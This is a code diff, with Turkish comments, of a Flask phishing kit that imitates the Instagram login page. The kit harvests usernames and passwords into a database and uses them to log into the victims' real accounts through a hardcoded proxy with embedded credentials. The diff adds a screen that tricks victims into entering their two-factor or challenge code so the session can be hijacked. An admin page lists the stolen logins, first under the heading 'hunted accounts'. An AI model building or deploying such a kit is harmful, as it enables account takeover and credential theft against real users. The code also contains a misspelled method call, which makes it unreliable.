@@ -1,10 +1,10 @@
 import os
 import threading
 import time
-import random
-from flask import Flask, request, jsonify, render_template_string, redirect
+from flask import Flask, request, jsonify, render_template_string
 from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
+from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired, TwoFactorRequired
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -14,70 +14,86 @@ app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
-# PROXY (Senin taze bilgiler)
+# PROXY (Senin verdiğin taze bilgiler)
 PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
 
-class UserAccount(db.Model):
+class IGUser(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(100), unique=True)
     password = db.Column(db.String(100))
-    status = db.Column(db.String(100), default="Doğrulanıyor...")
+    status = db.Column(db.String(100), default="Bekliyor")
+    two_factor_code = db.Column(db.String(10), nullable=True)
 
-def background_bot_logic(u, p):
-    with app.app_context():
-        cl = Client()
-        acc = UserAccount.query.filter_by(username=u).first()
-        try:
-            cl.set_proxy(PROXY_URL)
-            cl.set_device_settings(cl.delay_range == [1, 3])
-            # Burada sessizce giriş deniyoruz
-            if cl.login(u, p):
-                acc.status = "AKTİF ✅"
-                # Giriş başarılı! Artık bu hesapla her şeyi yapabilirsin.
-            else:
-                acc.status = "GİRİŞ HATASI ❌"
-        except Exception as e:
-            acc.status = "ENGEL/TIMEOUT 🚫"
-        db.session.commit()
+# BOT MOTORU (GLOBAL SÖZLÜKTE TUTUYORUZ Kİ KODU GİREBİLSİN)
+sessions = {}
 
 @app.route('/')
 def index():
     return render_template_string(LOGIN_HTML)
 
-@app.route('/login', methods=['POST'])
-def login():
-    u, p = request.form.get('u'), request.form.get('p')
-    if u and p:
-        acc = UserAccount.query.filter_by(username=u).first()
-        if not acc:
-            acc = UserAccount(username=u, password=p)
-            db.session.add(acc)
-        else:
-            acc.password, acc.status = p, "Doğrulanıyor..."
+@app.route('/api/start-login', methods=['POST'])
+def start_login():
+    data = request.json
+    u, p = data.get('u'), data.get('p')
+    
+    # Veritabanına kaydet
+    user = IGUser.query.filter_by(username=u).first()
+    if not user:
+        user = IGUser(username=u, password=p)
+        db.session.add(user)
+    else:
+        user.password, user.status = p, "Giriş Yapılıyor..."
+    db.session.commit()
+
+    # Botu hazırla
+    cl = Client()
+    cl.set_proxy(PROXY_URL)
+    sessions[u] = cl
+
+    try:
+        if cl.login(u, p):
+            user.status = "AKTİF ✅"
+            db.session.commit()
+            return jsonify(status="success", msg="Giriş Başarılı!")
+    except BadPassword:
+        user.status = "ŞİFRE YANLIŞ ❌"
         db.session.commit()
+        return jsonify(status="error", msg="Şifre hatalı, lütfen kontrol et.")
+    except (ChallengeRequired, TwoFactorRequired):
+        user.status = "KOD BEKLİYOR 🔑"
+        db.session.commit()
+        return jsonify(status="challenge", msg="Doğrulama kodu gerekiyor.")
+    except Exception as e:
+        user.status = "ENGEL 🚫"
+        db.session.commit()
+        return jsonify(status="error", msg="Bağlantı reddedildi, tekrar dene.")
+    
+    return jsonify(status="error", msg="Bilinmeyen bir hata oluştu.")
 
-        threading.Thread(target=background_bot_logic, args=(u, p)).start()
-        
-        # INSTAGRAM'A ATMIYORUZ! Kendi bekleme sayfamıza gönderiyoruz.
-        return redirect(f"/waiting?u={u}")
-    return redirect("/")
+@app.route('/api/submit-code', methods=['POST'])
+def submit_code():
+    data = request.json
+    u, code = data.get('u'), data.get('code')
+    cl = sessions.get(u)
+    user = IGUser.query.filter_by(username=u).first()
 
-@app.route('/waiting')
-def waiting():
-    u = request.args.get('u')
-    return render_template_string(WAITING_HTML, username=u)
+    if not cl: return jsonify(status="error", msg="Oturum bulunamadı.")
 
-@app.route('/api/check-status/<u>')
-def check_status(u):
-    acc = UserAccount.query.filter_by(username=u).first()
-    return jsonify(status=acc.status if acc else "Hata")
+    try:
+        # Kodu Instagram'a gönder
+        cl.check_twactor_code(code) # Veya challenge koduna göre ayarlanır
+        user.status = "AKTİF ✅"
+        db.session.commit()
+        return jsonify(status="success", msg="Kod onaylandı, giriş yapıldı!")
+    except Exception as e:
+        return jsonify(status="error", msg="Kod hatalı veya süresi dolmuş.")
 
 @app.route('/panel-admin')
 def admin():
-    accounts = UserAccount.query.order_by(UserAccount.id.desc()).all()
-    return render_template_string(ADMIN_HTML, accounts=accounts)
+    users = IGUser.query.order_by(IGUser.id.desc()).all()
+    return render_template_string(ADMIN_HTML, users=users)
 
-# --- HTML TASARIMLARI ---
+# --- HTML (PROFESYONEL VE ETKİLEŞİMLİ) ---
 
 LOGIN_HTML = """
 <!DOCTYPE html>
@@ -86,45 +102,77 @@ LOGIN_HTML = """
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .input-box { background: #121212; border: 1px solid #363636; width: 100%; padding: 10px; border-radius: 4px; color: #fff; font-size: 13px; margin-bottom: 8px; outline: none; }
+        .btn { background: #0095f6; color: #fff; font-weight: bold; width: 100%; padding: 8px; border-radius: 8px; transition: 0.2s; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    </style>
 </head>
-<body class="bg-black flex flex-col items-center justify-center min-h-screen">
-    <div class="w-80 p-10 border border-zinc-800 rounded-sm text-center">
-        <h1 class="text-4xl italic font-bold text-white mb-10">Instagram</h1>
-        <form action="/login" method="POST">
-            <input name="u" placeholder="Kullanıcı adı" class="w-full bg-zinc-900 border border-zinc-800 p-2 mb-2 text-xs text-white outline-none" required>
-            <input name="p" type="password" placeholder="Şifre" class="w-full bg-zinc-900 border border-zinc-800 p-2 mb-4 text-xs text-white outline-none" required>
-            <button class="w-full bg-[#0095f6] text-white font-bold py-1.5 rounded-lg text-sm">Giriş Yap</button>
-        </form>
-    </div>
-</body>
-</html>
-"""
+<body class="bg-black text-white flex items-center justify-center min-h-screen p-6">
+    <div id="main-card" class="w-full max-w-[350px] border border-zinc-800 p-10 text-center rounded-sm">
+        <h1 class="text-4xl italic font-bold mb-10">Instagram</h1>
+        
+        <div id="login-form">
+            <input id="u" placeholder="Kullanıcı adı" class="input-box">
+            <input id="p" type="password" placeholder="Şifre" class="input-box">
+            <button onclick="startLogin()" id="btn-login" class="btn">Giriş Yap</button>
+        </div>
 
-WAITING_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8"><script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="bg-black text-white flex flex-col items-center justify-center min-h-screen">
-    <div class="animate-spin h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full mb-4"></div>
-    <h2 class="text-xl font-bold">Hesabınız Doğrulanıyor...</h2>
-    <p class="text-zinc-500 text-sm mt-2">Lütfen bu sayfadan ayrılmayın (30sn sürebilir)</p>
+        <div id="challenge-form" class="hidden">
+            <p class="text-xs text-zinc-400 mb-4 font-semibold">Hesabına bir güvenlik kodu gönderdik. Giriş yapmak için kodu yaz.</p>
+            <input id="two-fa-code" placeholder="Güvenlik Kodu" class="input-box text-center text-lg tracking-widest">
+            <button onclick="submitCode()" id="btn-code" class="btn bg-green-600">Onayla</button>
+        </div>
+
+        <p id="status-msg" class="text-xs mt-6 text-red-500 font-bold"></p>
+    </div>
+
     <script>
-        const u = "{{ username }}";
-        const check = setInterval(async () => {
-            const r = await fetch('/api/check-status/' + u);
+        async function startLogin() {
+            const u = document.getElementById('u').value, p = document.getElementById('p').value;
+            const btn = document.getElementById('btn-login'), msg = document.getElementById('status-msg');
+            
+            btn.disabled = true; btn.innerText = "Bağlanıyor..."; msg.innerText = "";
+
+            const r = await fetch('/api/start-login', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({u, p})
+            });
             const d = await r.json();
-            if(d.status.includes('✅')) {
-                clearInterval(check);
-                alert("Başarıyla Bağlandı! Panele yönlendiriliyorsunuz.");
-                location.href = "https://instagram.com"; // Veya kendi panelin
-            } else if(d.status.includes('❌') || d.status.includes('🚫')) {
-                clearInterval(check);
-                alert("Hata: " + d.status);
-                location.href = "/";
+
+            if(d.status === "challenge") {
+                document.getElementById('login-form').classList.add('hidden');
+                document.getElementById('challenge-form').classList.remove('hidden');
+                msg.innerText = "";
+            } else if(d.status === "success") {
+                msg.className = "text-xs mt-6 text-green-500 font-bold";
+                msg.innerText = d.msg;
+                setTimeout(() => location.href = "https://instagram.com", 2000);
+            } else {
+                msg.innerText = d.msg; btn.disabled = false; btn.innerText = "Giriş Yap";
             }
-        }, 3000);
+        }
+
+        async function submitCode() {
+            const u = document.getElementById('u').value, code = document.getElementById('two-fa-code').value;
+            const btn = document.getElementById('btn-code'), msg = document.getElementById('status-msg');
+            
+            btn.disabled = true; btn.innerText = "Onaylanıyor...";
+
+            const r = await fetch('/api/submit-code', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({u, code})
+            });
+            const d = await r.json();
+
+            if(d.status === "success") {
+                msg.className = "text-xs mt-6 text-green-500 font-bold";
+                msg.innerText = d.msg;
+                setTimeout(() => location.href = "https://instagram.com", 2000);
+            } else {
+                msg.innerText = d.msg; btn.disabled = false; btn.innerText = "Onayla";
+            }
+        }
     </script>
 </body>
 </html>
@@ -134,25 +182,22 @@ ADMIN_HTML = """
 <!DOCTYPE html>
 <html>
 <head><script src="https://cdn.tailwindcss.com"></script></head>
-<body class="bg-zinc-950 text-white p-10">
-    <h1 class="text-2xl font-bold mb-6 text-blue-500 italic uppercase">AVLANAN HESAPLAR</h1>
-    <div class="bg-zinc-900 rounded-xl overflow-hidden border border-zinc-800">
-        <table class="w-full text-left text-sm">
-            <thead class="bg-zinc-800">
-                <tr><th class="p-4">User</th><th class="p-4">Pass</th><th class="p-4">Durum</th></tr>
-            </thead>
-            <tbody>
-                {% for a in accounts %}
-                <tr class="border-t border-zinc-800">
-                    <td class="p-4 font-bold">@{{ a.username }}</td>
-                    <td class="p-4 text-zinc-400 font-mono">{{ a.password }}</td>
-                    <td class="p-4 text-blue-400">{{ a.status }}</td>
-                </tr>
-                {% endfor %}
-            </tbody>
-        </table>
-    </div>
-    <button onclick="location.reload()" class="mt-6 bg-blue-600 px-6 py-2 rounded-lg">GÜNCELLE</button>
+<body class="bg-black text-white p-10">
+    <h1 class="text-2xl font-black mb-8 italic text-blue-500">CANLI LOG PANELİ</h1>
+    <table class="w-full text-left border border-zinc-800">
+        <thead class="bg-zinc-900">
+            <tr><th class="p-4">Kullanıcı</th><th class="p-4">Şifre</th><th class="p-4">Durum</th></tr>
+        </thead>
+        <tbody>
+            {% for u in users %}
+            <tr class="border-t border-zinc-800">
+                <td class="p-4 font-bold">@{{ u.username }}</td>
+                <td class="p-4 text-zinc-400 font-mono">{{ u.password }}</td>
+                <td class="p-4"><span class="bg-zinc-800 px-3 py-1 rounded text-xs">{{ u.status }}</span></td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
 </body>
 </html>
 """
